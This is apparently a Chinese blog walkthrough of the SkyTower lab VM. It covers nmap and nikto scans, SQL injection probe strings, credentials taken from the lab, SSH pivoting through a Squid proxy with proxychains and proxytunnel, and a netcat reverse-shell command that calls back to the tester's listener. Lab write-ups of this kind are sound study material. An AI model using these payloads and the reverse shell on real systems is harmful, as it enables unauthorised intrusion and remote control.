---
title: skytower
date: 2024年12月12日
updated: 2024年12月12日
tags:
  - 靶场
categories: 靶场
keywords:
description: skytower
---

# 信息收集
上来永远是经典的nmap扫描端口

```ABAP
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV -A -T5 -p- 192.168.199.138
[sudo] kali 的密码：
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 14:03 CST
Nmap scan report for 192.168.199.138
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.20
MAC Address: 00:0C:29:3E:4A:30 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.12 ms 192.168.199.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.04 seconds
```

开放了22端口可以尝试ssh链接，开放了80端口可能有页面收集信息环节，3128端口是squid-http是一个代理端口
ssh还是filtered状态，我们可以利用squid-http代理做端口转发开启 ssh

访问192.168.199.138,发发现是一个登录框

对于登录框
我们的方法可以有
```ABAP
sql注入
暴力破解
cms框架漏洞
插件漏洞
数据库+中间件+框架
```

![](https://pic.imgdb.cn/item/675a9fe9d0e0a243d4e2bd69.png)

**nikto**  可以看一下网站的东西
```ABAP
┌──(kali㉿kali)-[~]
└─$ nikto -h http://192.168.199.138/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.199.138
+ Target Hostname:    192.168.199.138
+ Target Port:        80
+ Start Time:         2024-12-12 16:40:28 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ /: Server may leak inodes via ETags, header found with file /, inode: 87, size: 1136, mtime: Fri Jun 20 19:23:36 2014. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /login.php: Retrieved x-powered-by header: PHP/5.4.4-14+deb7u9.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2024-12-12 16:40:37 (GMT8) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
先尝试跑一个sql注入，github随便下一个字典然后直接跑，看输出里面的响应大小，

那么怎么判断是不是sql注入漏洞
```ABAP
一般来说跑一下
' and '1' = '1
and 1'1 = '2
and 1=1
and sleep(5)
and 1=2
`--这种就差不多

需要注意的是sql server，oracle注释可以用--,mysql可以用#,--

/**/、 ;%00 、 /*letmetest*/
```
![](https://pic.imgdb.cn/item/675bbcced0e0a243d4e35242.png)

这里说你输入的sql语法有问题，所以是存在sql注入漏洞的

sql注入原理可以去看前面的那个代码审计的，里面写了一下那个sql注入成因

扯远了，回到靶机

![](https://pic.imgdb.cn/item/675bc043d0e0a243d4e352c3.png)

看一下成功的，说了账号密码是john:hereisjohn,需要注意的是，给出来的是账号密码而你的登陆界面是email和密码，所以你不能通过这个登录进去

我们这是应该是考虑之前的3128端口的

代理有两种方式，分别是`proxychains`和`proxytunnel`

3128端口开启squid-http
squid cache是流行最广的，使用最普遍的开源缓存代理服务器

下载proxychains并在proxychains4.conf里面添加对面的ip地址端口号以及协议

```Actionscript
┌──(root㉿kali)-[~]
└─# vi /etc/proxychains4.conf
```

![](https://pic.imgdb.cn/item/676bd86bd0e0a243d4ea1876.png)

然后使用proxychains4来代理

```Actionscript
proxychains ssh john@192.168.98.129
```
![](https://pic.imgdb.cn/item/676bf101d0e0a243d4ea4a84.png)

不能直接ssh连接，所以我们可以试试`-t cat /etc/passwd`看看能不能执行指令

![](https://pic.imgdb.cn/item/676bf14ed0e0a243d4ea4a8f.png)

使用`where python`发现无回显，表明里面是没有安装python的,那我们试试nc连接

```Actionscript
┌──(root㉿kali)-[~]
└─# proxychains ssh john@192.168.98.129 -t 'nc 192.168.98.128 6677 -e /bin/bash'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/i386-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.98.129:3128  ...  192.168.98.129:22  ...  OK
john@192.168.98.129's password:

另一边

┌──(root㉿kali)-[~]
└─# nc -vlp 6677
listening on [any] 6677 ...
192.168.98.129: inverse host lookup failed: Unknown host
connect to [192.168.98.128] from (UNKNOWN) [192.168.98.129] 60305

```

或者我们用另一种的隧道连接方式，就是前面代理的方式我们换成proxytunnel隧道代理

```Actionscript
┌──(root㉿kali)-[~]
└─# proxytunnel -p 192.168.98.129:3128 -d 127.0.0.1:22 -a 1234
```

建立一个代理隧道

但是后面是一样的

### pty小技巧
socat
顺着这个题目，
![](https://pic.imgdb.cn/item/676bfd6ad0e0a243d4ea4d91.png)

![](https://pic.imgdb.cn/item/676bfd6bd0e0a243d4ea4d92.png)

```Actionscript
通过python -m http.server 80开启http服务

另一面直接wget
```

看了眼教程下一步是三方在nc里面执行socat然后在把shell弹另一个界面（我勒个甩锅）